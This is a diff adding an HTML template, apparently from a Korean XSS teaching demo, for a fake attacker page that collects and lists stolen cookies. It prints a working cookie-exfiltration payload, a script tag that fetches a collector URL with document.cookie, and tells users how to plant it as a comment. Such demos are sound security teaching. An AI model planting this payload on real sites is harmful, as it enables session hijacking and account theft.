@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head th:replace="~{fragments/head :: head('쿠키 탈취 수신함')}"></head>
+<body>
+<nav th:replace="~{fragments/navbar :: navbar}"></nav>
+
+<div class="container py-4">
+    <div class="mb-4">
+        <div class="demo-nav">
+            <a th:href="@{/demo}">← 데모 목록</a>
+            <a th:href="@{/demo/xss}">XSS</a>
+        </div>
+        <h2 class="fw-bold">쿠키 탈취 수신함 (데모용 공격자 서버)</h2>
+        <p class="text-muted">
+            실제 공격에서는 외부 서버가 이 역할을 합니다.<br>
+            XSS 페이로드가 실행되면 피해자의 쿠키가 이 페이지로 전송됩니다.
+        </p>
+    </div>
+
+    <div class="alert alert-secondary mb-4">
+        <strong>사용 방법</strong><br>
+        <small>
+            1. 취약 모드로 로그인 (로그인 페이지 → 안전 모드 체크 해제)<br>
+            2. XSS 데모에서 아래 페이로드를 댓글로 등록<br>
+            3. 댓글 조회 시 스크립트가 실행되어 쿠키가 이 페이지로 전송됨
+        </small>
+        <div class="mt-2">
+            <code th:text="'&lt;script&gt;fetch(\'' + @{/demo/steal} + '?c=\'+document.cookie)&lt;/script&gt;'">페이로드</code>
+        </div>
+    </div>
+
+    <div class="d-flex justify-content-between align-items-center mb-3">
+        <h5 class="fw-bold mb-0">수신된 쿠키 목록 (<span th:text="${stolenList.size()}">0</span>건)</h5>
+        <form th:action="@{/demo/steal/clear}" method="post" class="d-inline">
+            <button type="submit" class="btn btn-sm btn-outline-secondary"
+                    onclick="return confirm('수신 목록을 초기화하시겠습니까?')">초기화</button>
+        </form>
+    </div>
+
+    <div th:if="${stolenList.isEmpty()}" class="text-muted">
+        아직 수신된 쿠키가 없습니다. XSS 페이로드를 실행해보세요.
+    </div>
+
+    <div th:each="entry : ${stolenList}" class="card mb-2">
+        <div class="card-body py-2 px-3">
+            <small class="text-muted" th:text="${entry[0]}">시간</small>
+            <div class="font-monospace mt-1" th:text="${entry[1].isEmpty() ? '(쿠키 없음 — 로그인 상태가 아님)' : entry[1]}">쿠키값</div>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
